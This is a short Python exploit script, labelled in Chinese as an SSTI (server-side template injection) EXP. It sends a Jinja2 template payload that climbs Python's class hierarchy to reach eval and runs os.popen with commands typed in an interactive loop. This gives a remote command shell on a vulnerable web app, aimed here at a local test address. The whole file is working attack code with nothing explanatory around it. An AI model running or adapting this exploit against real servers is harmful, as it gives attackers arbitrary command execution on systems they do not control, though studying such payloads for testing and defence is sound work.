"""
SSTI 服务端模板注入 EXP
"""
import requests

url = 'http://127.0.0.1:5000/'
cmd = "whoami"
while cmd:
    payload = '''?name=
    {% for c in [].__class__.__base__.__subclasses__() %}
    {% if c.__name__ == 'catch_warnings' %}
      {% for b in c.__init__.__globals__.values() %}
      {% if b.__class__ == {}.__class__ %}
        {% if 'eval' in b.keys() %}
          {{ b['eval']('__import__("os").popen("''' + cmd + '''").read()') }}
        {% endif %}
      {% endif %}
      {% endfor %}
    {% endif %}
    {% endfor %}
    '''

    res = requests.get(url+payload)
    msg = res.text.split('HEllo')[-1].strip()
    print(msg)
    cmd = input("cmd>>>")